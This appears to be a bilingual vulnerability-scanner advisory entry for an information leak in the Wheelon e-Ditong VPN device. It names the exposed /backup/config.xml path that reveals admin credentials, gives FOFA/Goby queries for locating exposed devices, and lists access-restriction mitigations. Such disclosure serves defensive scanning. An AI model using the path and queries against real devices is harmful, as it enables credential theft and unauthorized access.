Name: Wheelon-e Ditong VPN infoformation leakage
Description: Wheelon-e Ditong VPN is a next-generation application-layer firewall hardware device, suitable for small and medium-sized enterprises. Wheelton-e Ditong VPN has information leakage in /backup/config.xml.
Author: goodnight_meow@protonmail.com
FofaQuery: app="惠尔顿-e地通VPN"||body="e地通Socks5 VPN登录系统"
GobyQuery: app="惠尔顿-e地通VPN"||body="e地通Socks5 VPN登录系统"
Impact: Wheelton-e Ditong VPN has information leakage in /backup/config.xml. Attackers can use information leakage to obtain management account passwords, directly log in to the device, and other accounts, information, and configurations.
Recommendation:
1. Set access policies and whitelist access through security devices such as firewalls.

2. If unnecessary, prohibit public access to the system.

CN.Name: 惠尔顿-e地通VPN信息泄露
CN.Description: 惠尔顿-e地通VPN是下一代的应用层防火墙硬件设备，适用于中小型企业。惠尔顿-e地通VPN在/backup/config.xml存在信息泄露。
CN.Impact: 惠尔顿-e地通VPN在/backup/config.xml存在信息泄露。攻击者可利用信息泄漏，获取管理账号密码，直接登录设备，以及其它账号、信息、配置等。
CN.Recommendation:
1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。

2、如⾮必要，禁⽌公⽹访问该系统。
